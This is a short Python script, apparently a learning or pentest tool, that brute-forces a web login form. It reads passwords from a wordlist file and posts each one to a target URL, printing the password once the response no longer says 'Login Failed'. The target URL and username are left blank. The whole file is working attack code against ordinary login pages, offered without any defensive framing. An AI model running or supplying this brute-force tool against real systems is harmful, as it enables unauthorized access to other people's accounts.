#!/usr/bin/env python3

import requests


target_url = ""
data = {"username": "", "password": "", "login": "submit"}

with open("passowrds.txt") as word_file:
    for line in word_file:
        word = line.strip()
        data["password"] = word
        res = requests.post(target_url, data=data)
        if "Login Failed" not in res.content.decode():
            print("[+] Get the password --> " + word)
            exit()

print("[+] Reached end of line")
